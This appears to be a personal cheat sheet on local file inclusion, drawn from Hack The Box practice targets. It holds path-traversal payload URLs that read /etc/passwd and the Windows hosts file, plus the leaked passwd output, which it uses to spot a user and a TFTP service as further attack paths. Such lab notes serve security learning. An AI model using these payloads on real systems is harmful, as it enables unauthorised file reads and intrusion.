# LFI
https://portswigger.net/web-security/file-path-traversal
https://portswigger.net/kb/issues/00100300_file-path-traversal
## Basic
```
# Take an example URL
http://unika.htb/index.php?page=french.html

# I suspect parameter page is vulnerable to LFI.
# Requesting below URL URL results ine error
http://unika.htb/index.php?page=/french.html
Error: Warning: include(/french.html): Failed to open stream: No such file or directory in C:\xampp\htdocs\index.php on line 11

# I will try the following (Linux web server)
http://unika.htb/index.php?page=../../../etc/passwd
http://unika.htb/index.php?page=/etc/passwd

# On Windows web server
http://unika.htb/index.php?page=../../../../../../../../windows/system32/drivers/etc/hosts
http://unika.htb/index.php?page=/windows/system32/drivers/etc/hosts
```

## Further exploitation
First let's exploit LFI to read `/etc/passwd` file
```
http://10.129.95.185/?file=/etc/passwd

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
[...]
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin pollinate:x:109:1::/var/cache/pollinate:/bin/false
mike:x:1000:1000:mike:/home/mike:/bin/bash
tftp:x:110:113:tftp daemon,,,:/var/lib/tftpboot:/usr/sbin/nologin
```
We see two interesting entries in the last lines:
- mike - local user
- tftp - running service
  
Now this gives me more info about potential attack vectors.
